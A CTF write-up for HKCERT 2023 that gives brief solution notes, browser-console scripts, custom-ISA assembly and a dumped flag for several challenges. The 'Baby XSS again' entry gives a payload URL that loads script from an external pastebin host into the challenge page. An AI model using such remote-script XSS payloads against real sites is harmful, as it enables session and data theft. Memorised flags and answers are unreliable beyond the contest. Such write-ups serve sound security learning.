# HK Cyber Security New Generation CTF Challenge 2023

<https://ctftime.org/event/2122>

Solved Challenges

- ISA Jump Scare
- ISA Intrusion
- Baby XSS again
- Tuning Keyboard 4
- Re:Zero
- Feedback
- ST Code (I)
- Fake/Ground Offer
- Sanity check
- ISA Jogger
- Psychic AI
- Yes, I Know I Know
- Sign me a Flag (I)

## 10: Tuning Keyboard 4

See [tuning-keyboard.js](./tuning-keyboard.js)

## 11: ST Code (I)

Simple number fetching and decoding.

```js
Array.from(document.querySelectorAll("rect")).map((r)=>r.getAttribute('rx')).join('');
```

<https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=MDExMDEwMDAwMTEwMTAxMTAxMTAwMDExMDExMDAxMDEwMTExMDAxMDAxMTEwMTAwMDAxMTAwMTAwMDExMDAxMTAxMTExMDExMDEwMTAwMTEwMTAxMDEwMDAxMDExMTExMDEwMTAwMTEwMTAxMDEwMDAwMTAwMTEwMDExMTAwMTEwMDExMDEwMDAxMDExMTExMDEwMTAwMTEwMTAxMDEwMDAxMTAwMTAxMDExMDAxMTEwMTEwMDAwMTAxMTAxMTEwMDAxMTAwMDAwMTEwMDExMTAxMTEwMDEwMDExMDAwMDEwMTExMDAwMDAxMTAxMDAwMDExMTEwMDEwMDEwMTEwMTAwMTAxMTAxMDEwMTAwMTEwMTAxMDEwMDAxMTAwMTAxMDExMDAxMTEwMDExMDAwMDAxMTExMTAx>

## 32: Baby XSS again

Payload: <http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232/?src=https://pastebin.com/dl/xNRmEBhV>

## 37: Fake/Ground Offer

Check [fake_ground_offer.py](./fake_ground_offer.py).

## 44: ISA Jump Scare

Exit 0 Example

```asm
JMP 0x400011
JMP MOV R8, 2
JMP 0x40002c
JMP MOV R1, 0
JMP 0x400047
JMP SYSCALL
```

Ans: See ihateasm.py

## 58: ISA Intrusion

Annoying memory reading.

```js
allTextNodes = document.querySelectorAll("#app > div > div.row.py-2 > div:nth-child(2) > div:nth-child(3) > div > div > div.vue-recycle-scroller.ready.direction-vertical.scroller > div.vue-recycle-scroller__item-wrapper > div > span > span:nth-child(10)");
Array.from(allTextNodes).map( (node) => {return node.innerText} ).join('');
```

```txt
9df15;.PUSH 0xde0c7383;.PUSH 0x161c73a6;.PUSH 0x5fed2896;.PUSH 0xe302a383;.MOV S................_....i>..m.s{.R.8_MM.r|.4.pQ........V....!..l{..-^.... .....s.N.........X..L..j..&...R.[..^nQ...K......Z[.>...//..'r-a.Qk.^..iBq ...f:..hkcert23{s0m3t1m3_i7s_e4si3r_70_dyn4m1c_r3v_ju5t_p4tch&l0ok_4t_m3mory}..................................................
```

## 65: Jogger

Exit 0 example

```asm
MOV R8, 2
MOV R1, 0
MOV [FP], 0x0a4c4c41
MOV [FP-0x4], 0x43535953;

MOV R6, 0x4000a1
MOV R7, [FP-0x4]
MOV [R6], R7

MOV R6, 0x4000a5
MOV R7, [FP-0]
MOV [R6], R7
```

Move SYSCALL to frame.
and move it back to the memory section to replace instruction placeholders.

There's a bug that jogger doesn't like, which is the ';' and '\n' character.
Remove them accordingly...

Target: add SYSCALL dynamically.

Trick: set breakpoints at `MOV 0x0` and keep replacing the address.

See [ihateasm_jogger.txt](./ihateasm_jogger.txt)
